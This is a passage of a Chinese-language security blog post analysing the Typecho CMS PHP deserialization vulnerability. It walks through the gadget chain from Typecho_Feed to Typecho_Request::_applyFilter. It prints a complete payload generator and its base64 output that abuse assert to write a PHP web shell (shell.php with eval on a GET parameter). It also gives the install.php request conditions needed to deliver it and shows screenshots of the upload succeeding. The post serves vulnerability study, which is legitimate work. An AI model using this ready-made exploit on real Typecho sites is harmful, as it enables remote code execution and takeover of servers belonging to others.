    <span class="token variable">$content</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;pubDate>'</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">dateFormat</span><span class="token punctuation">(</span><span class="token variable">$item</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'date'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'&lt;/pubDate>'</span> <span class="token punctuation">.</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">EOL</span><span class="token punctuation">;</span>
    <span class="token variable">$content</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'&lt;dc:creator>'</span> <span class="token punctuation">.</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$item</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'author'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">screenName</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'&lt;/dc:creator>'</span> <span class="token punctuation">.</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">EOL</span><span class="token punctuation">;</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>全局搜索魔术方法<font color=purple><code>__get()</code></font>后，在<font color=orange><code>\var\Typecho\Request.php</code></font>中找到该方法：在该方法中调用了<font color=orange><code>get()</code></font>方法，其中给传入的不存在的属性赋值并调用<font color=orange><code>_applyFilter()</code></font>方法</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$default</span> <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token boolean constant">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">case</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token keyword">isset</span><span class="token punctuation">(</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$_httpParams</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token variable">$value</span> <span class="token operator">=</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$_httpParams</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">default</span><span class="token punctuation">:</span>
            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$default</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token operator">!</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">?</span> <span class="token variable">$value</span> <span class="token punctuation">:</span> <span class="token variable">$default</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">_applyFilter</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>在<font color=orange><code>_applyFilter()</code></font>中，将根据<font color=orange><code>$value</code></font>是否为数组来调用<font color=orange><code>array_map()</code></font>或<font color=orange><code>call_user_func()</code></font>函数，而这两个函数便可以执行命令</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">_applyFilter</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_filter</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_filter</span> <span class="token keyword">as</span> <span class="token variable">$filter</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">array_map</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">:</span>
    <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_filter</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">return</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h4 id="3-3-复现流程"><a href="#3-3-复现流程" class="headerlink" title="3.3 复现流程"></a>3.3 复现流程</h4><p>经过上文的分析，整个流程也就清晰了：</p>
<ol>
<li>构造payload绕过并执行反序列化（需要base64编码）</li>
<li>payload需通过cookie或POST方式传入</li>
<li>payload中的<font color=orange><code>Config</code></font>属性传入<font color=orange><code>Typecho_Db</code></font>中，<font color=orange><code>Typecho_Db</code></font>会触发<font color=purple><code>__toString()</code></font>魔术方法</li>
<li>在<font color=purple><code>__toString()</code></font>魔术方法中再触发<font color=purple><code>__get()</code></font>魔术方法</li>
<li>最后利用<font color=purple><code>__get()</code></font>魔术方法中的函数调用<font color=orange><code>array_map()</code></font>或<font color=orange><code>call_user_func()</code></font>函数从而实现命令执行</li>
</ol>
<h4 id="3-4-payload构造（参考-5-）"><a href="#3-4-payload构造（参考-5-）" class="headerlink" title="3.4 payload构造（参考[5]）"></a>3.4 payload构造（参考[5]）</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">Typecho_Feed</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$_type</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'ATOM 1.0'</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$_items</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">addItem</span><span class="token punctuation">(</span><span class="token keyword">array</span> <span class="token variable">$item</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_items</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$item</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name">Typecho_Request</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$_params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'screenName'</span><span class="token operator">=</span><span class="token operator">></span> <span class="token single-quoted-string string">'file_put_contents(\'shell.php\', \'&lt;?php @eval($_GET["shell"]);?>\')'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$_filter</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'assert'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$payload1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Typecho_Feed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$payload2</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Typecho_Request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$payload1</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addItem</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'author'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$payload2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$exp</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'adapter'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$payload1</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'prefix'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token single-quoted-string string">'typecho_'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$exp</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span>
//YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NjQ6ImZpbGVfcHV0X2NvbnRlbnRzKCdzaGVsbC5waHAnLCAnPD9waHAgQGV2YWwoJF9HRVRbInNoZWxsIl0pOz8+JykiO31zOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9maWx0ZXIiO2E6MTp7aTowO3M6NjoiYXNzZXJ0Ijt9fX19fXM6NjoicHJlZml4IjtzOjg6InR5cGVjaG9fIjt9
?></code></pre>

<p>构造并发送数据包，注意要满足<font color=orange><code>install.php</code></font>的要求：有<font color=orange><code>finish</code></font>参数和<font color=orange><code>HTTP_REFERER</code></font></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//判断是否已经安装</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'finish'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">__TYPECHO_ROOT_DIR__</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'/config.inc.php'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'typecho'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">exit</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'HTTP_REFERER'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">exit</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token variable">$parts</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'HTTP_REFERER'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$parts</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'port'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$parts</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'host'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$parts</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>:<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$parts</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'port'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$parts</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'HTTP_HOST'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token variable">$parts</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">exit</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>构造请求如下：</p>
<p><img src="https://raw.githubusercontent.com/Jmhram/markdown/main/img/20210430201511.png" alt="image-20210430201358165" loading="lazy"></p>
<p>shell上传成功：</p>
<p><img src="https://raw.githubusercontent.com/Jmhram/markdown/main/img/20210430201504.png" alt="image-20210430201431734" loading="lazy"></p>
<h3 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h3><p>[1] [红日安全]Web安全Day15 - 反序列化实战攻防 <a href="https://xz.aliyun.com/t/7023">https://xz.aliyun.com/t/7023</a></p>
<p>[2] PHP 魔术方法 - 简介 <a href="https://www.twle.cn/c/yufei/phpmmethod/phpmmethod-basic-index.html">https://www.twle.cn/c/yufei/phpmmethod/phpmmethod-basic-index.html</a></p>
<p>[3] [BUUCTF-WEB] [网鼎杯 2020 青龙组]AreUSerialz <a href="https://juejin.cn/post/6929123441257742350">https://juejin.cn/post/6929123441257742350</a></p>
<p>[4] AreUSerialz-[网鼎杯 2020 青龙组]-[传送门-＞BUUCTF] <a href="https://www.secn.net/article/349246.html">https://www.secn.net/article/349246.html</a></p>
<p>[5] Typecho反序列化漏洞分析 <a href="https://lanvnal.com/2020/03/15/typecho-fan-xu-lie-hua-lou-dong-fen-xi/">https://lanvnal.com/2020/03/15/typecho-fan-xu-lie-hua-lou-dong-fen-xi/</a></p>
<p>[6] 浅谈php反序列化漏洞 <a href="https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p>
<p>[7] php反序列化漏洞 <a href="https://www.cnblogs.com/Lmg66/p/13709419.html">https://www.cnblogs.com/Lmg66/p/13709419.html</a></p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
        <tag>Web</tag>
      </tags>
  </entry>
</search>
